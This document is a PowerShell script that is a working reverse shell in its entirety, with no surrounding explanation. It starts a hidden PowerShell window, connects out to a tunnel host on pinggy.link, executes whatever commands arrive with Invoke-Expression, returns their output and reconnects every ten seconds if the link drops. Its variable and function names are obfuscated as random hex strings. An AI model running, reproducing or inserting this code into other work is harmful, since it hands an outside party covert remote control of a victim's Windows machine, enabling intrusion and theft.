Start-Process $PSHOME\powershell.exe -ArgumentList {
  while ($true) {
    try {
      $2104c9cc9f294cd9a6d62f9ac96968a8 = New-Object Net.Sockets.TCPClient('rnbpl-39-43-132-174.a.free.pinggy.link', 35223);
      $5012fc220c634fbd9ce341a5509b0b1f = $2104c9cc9f294cd9a6d62f9ac96968a8.GetStream();
      $03f619a9bb1340458310955381cfb40e = New-Object IO.StreamWriter($5012fc220c634fbd9ce341a5509b0b1f);
      [byte[]]$335a4a9f0d964a3baf8f40116f8436d2 = 0..$2104c9cc9f294cd9a6d62f9ac96968a8.ReceiveBufferSize | % {0};

      function caa9a36ef94042bea67f2c18685b82da ($d4e7b81fca1d472bb7f65df282ae57f9) {
        $03f619a9bb1340458310955381cfb40e.Write($d4e7b81fca1d472bb7f65df282ae57f9);
        $03f619a9bb1340458310955381cfb40e.Flush()
      }

      caa9a36ef94042bea67f2c18685b82da '';

      while (($5e7dba5250af41e88a97a5d1347e4537 = $5012fc220c634fbd9ce341a5509b0b1f.Read($335a4a9f0d964a3baf8f40116f8436d2, 0, $335a4a9f0d964a3baf8f40116f8436d2.Length)) -gt 0) {
        $ac11601f08cd45bf9eb83dd8cbed3ac1 = ([text.encoding]::UTF8).GetString($335a4a9f0d964a3baf8f40116f8436d2, 0, $5e7dba5250af41e88a97a5d1347e4537 - 1);
        $7f7c76cae2bf4602a557875fbea186ac = try {
          Invoke-Expression $ac11601f08cd45bf9eb83dd8cbed3ac1 2>&1 | Out-String
        } catch {
          $_ | Out-String
        }
        caa9a36ef94042bea67f2c18685b82da ($7f7c76cae2bf4602a557875fbea186ac)
      }

      $03f619a9bb1340458310955381cfb40e.Close()
      $2104c9cc9f294cd9a6d62f9ac96968a8.Close()
    }
    catch {
      # Connection failed or dropped, wait 10 seconds before retrying
      Start-Sleep -Seconds 10
    }
  }
} -WindowStyle Hidden
